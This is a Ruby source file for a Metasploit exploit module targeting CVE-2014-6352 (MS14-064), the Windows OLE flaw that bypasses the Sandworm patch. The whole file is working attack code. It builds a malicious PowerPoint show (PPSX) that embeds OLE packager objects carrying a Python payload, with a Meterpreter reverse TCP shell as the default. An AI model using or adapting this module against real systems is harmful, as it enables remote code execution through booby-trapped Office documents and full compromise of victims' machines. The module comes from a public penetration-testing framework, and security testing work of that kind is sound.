##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::EXE

  def initialize(info={})
    super(update_info(info,
      'Name'           => "MS14-064 Microsoft Windows OLE Package Manager Code Execution Through Python",
      'Description'    => %q{
        This module exploits a vulnerability found in Windows Object Linking and Embedding (OLE)
        allowing arbitrary code execution, bypassing the patch MS14-060, for the vulnerability
        publicly known as "Sandworm", on systems with Python for Windows installed. Windows Vista
        SP2 all the way to Windows 8, Windows Server 2008 and 2012 are known to be vulnerable.
        However, based on our testing, the most reliable setup is on Windows platforms running
        Office 2013 and Office 2010 SP2. Please keep in mind that some other setups such as
        those using Office 2010 SP1 may be less stable, and may end up with a crash due to a
        failure in the CPackage::CreateTempFileName function.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Haifei Li', # Vulnerability discovery and exploit technique
          'sinn3r', # Metasploit module
          'juan vazquez' # Metasploit module
        ],
      'References'     =>
        [
          ['CVE', '2014-6352'],
          ['MSB', 'MS14-064'],
          ['BID', '70690'],
          ['URL', 'http://blogs.mcafee.com/mcafee-labs/bypassing-microsofts-patch-for-the-sandworm-zero-day-even-editing-can-cause-harm']
        ],
      'Platform'       => 'python',
      'Arch'           => ARCH_PYTHON,
      'Targets'        =>
        [
          ['Windows 7 SP1 with Python for Windows / Office 2010 SP2 / Office 2013', {}],
        ],
      'Privileged'     => false,
      'DefaultOptions' =>
        {
          'Payload' => 'python/meterpreter/reverse_tcp'
        },
      'DisclosureDate' => "Nov 12 2014",
      'DefaultTarget'  => 0))

    register_options(
      [
        OptString.new('FILENAME', [true, 'The PPSX file', 'msf.ppsx'])
      ], self.class)
  end

  def exploit
    print_status("Creating '#{datastore['FILENAME']}' file ...")
    payload_packager = create_packager('tabnanny.py', payload.encoded)
    trigger_packager = create_packager("#{rand_text_alpha(4)}.py", rand_text_alpha(4 + rand(10)))
    zip = zip_ppsx(payload_packager, trigger_packager)
    file_create(zip)
  end

  def zip_ppsx(ole_payload, ole_trigger)
    zip_data = {}
    data_dir = File.join(Msf::Config.data_directory, 'exploits', 'CVE-2014-4114', 'template')

    Dir["#{data_dir}/**/**"].each do |file|
      unless File.directory?(file)
        zip_data[file.sub(data_dir,'')] = File.read(file)
      end
    end

    # add the otherwise skipped "hidden" file
    file = "#{data_dir}/_rels/.rels"
    zip_data[file.sub(data_dir,'')] = File.read(file)

    # put our own OLE streams
    zip_data['/ppt/embeddings/oleObject1.bin'] = ole_payload
    zip_data['/ppt/embeddings/oleObject2.bin'] = ole_trigger

    # create the ppsx
    ppsx = Rex::Zip::Archive.new
    zip_data.each_pair do |k,v|
      ppsx.add_file(k,v)
    end

    ppsx.pack
  end

  def create_packager(file_name, contents)
    file_info = [2].pack('v')
    file_info << "#{file_name}\x00"
    file_info << "#{file_name}\x00"
    file_info << "\x00\x00"

    extract_info = [3].pack('v')
    extract_info << [file_name.length + 1].pack('V')
    extract_info << "#{file_name}\x00"

    file = [contents.length].pack('V')
    file << contents

    append_info = [file_name.length].pack('V')
    append_info << Rex::Text.to_unicode(file_name)
    append_info << [file_name.length].pack('V')
    append_info << Rex::Text.to_unicode(file_name)
    append_info << [file_name.length].pack('V')
    append_info << Rex::Text.to_unicode(file_name)

    ole_data = file_info + extract_info + file + append_info
    ole_contents = [ole_data.length].pack('V') + ole_data

    ole = create_ole("\x01OLE10Native", ole_contents)

    ole
  end

  def create_ole(stream_name, data)
    ole_tmp = Rex::Quickfile.new('ole')
    stg = Rex::OLE::Storage.new(ole_tmp.path, Rex::OLE::STGM_WRITE)

    stm = stg.create_stream(stream_name)
    stm << data
    stm.close

    directory = stg.instance_variable_get(:@directory)
    directory.each_entry do |entry|
      if entry.instance_variable_get(:@_ab) == 'Root Entry'
        # 0003000C-0000-0000-c000-000000000046 # Packager
        clsid = Rex::OLE::CLSID.new("\x0c\x00\x03\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x46")
        entry.instance_variable_set(:@_clsId, clsid)
      end
    end

    # write to disk
    stg.close

    ole_contents = File.read(ole_tmp.path)
    ole_tmp.close
    ole_tmp.unlink

    ole_contents
  end

end